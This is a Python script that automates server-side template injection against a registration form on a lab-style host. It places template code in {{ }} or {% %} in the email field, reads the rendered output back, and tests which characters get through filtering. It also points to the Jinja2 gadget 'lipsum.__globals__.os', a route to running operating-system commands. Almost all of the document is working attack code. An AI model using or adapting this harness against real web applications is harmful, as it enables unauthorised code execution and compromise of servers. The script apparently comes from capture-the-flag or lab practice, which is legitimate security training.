#!/usr/bin/env python3
import requests
from urllib.parse import quote_plus, urlencode,quote
from bs4 import BeautifulSoup
from argparse import ArgumentParser
import sys


class SSTI():
	def __init__(self, url, debug, status, min_len=6):
		self.url = url
		self.debug = debug
		self.count = 0
		self.status = status
		self.min_len = min_len

	def register(self, code, pw='a'):
		quoted_code = {
			0: '{{' + quote_plus(code) + '}}',
			1: code,
			2: quote_plus(code),
			3: '{%' + quote_plus(code) + '%}'
		}

		user = quoted_code[self.status] + '@b.co'
		if len(user) < self.min_len:
			user = user.replace('@', '@' +
								'b' * self.min_len - len(user))

		if self.debug:
			print(user)

		pw = quote_plus(pw)
		headers = {
			'Accept-Encoding': 'gzip, deflate',
			'Content-Type': 'application/x-www-form-urlencoded',
			'session': 'lipsum.__globals__.os'

		}
		data = {
			'email': user,
			'password': pw,
			'confirm': pw
		}

		if self.debug > 1:
			print('Headers: {}'.format(headers))
			print('Data: {}'.format(data))

		r = requests.post(self.url, headers=headers, data=data)
		if r.status_code != 200:
			return r.status_code, r.reason
		if self.debug > 1:
			print(r.headers)

		soup = BeautifulSoup(r.text, features='lxml')

		if self.debug > 2:
			print(soup.prettify())

		template = soup.select_one('p.help-block')

		if template:
			return template.text
		elif self.count > 1:
			return 'No result for {}'.format(user)
		else:
			self.count += 1
			return self.register(code, pw)

	def get_valid_chars(self):
		for i in range(128):
			if 'Invalid' not in self.register(chr(i)):
				print(chr(i), end='')
				sys.stdout.flush()
		print()



def get_args():
	parser = ArgumentParser()
	parser.add_argument('-i', '--code', help='Code to inject')
	parser.add_argument('-v', action='count', default=0, help='Verbosity')
	parser.add_argument('-q', '--quote', action='count', default=0)
	parser.add_argument('-c', '--chars', action='store_true')
	return parser.parse_args()


if __name__ == '__main__':
	args = get_args()
	url = 'http://10.102.0.62/user/register?c=(L=lipsum)'

	if args.chars:
		s = SSTI(url, debug=args.v, status=1)
		s.get_valid_chars()
	else:
		temp = SSTI(url, debug=args.v, status=args.quote)
		print(temp.register(args.code))
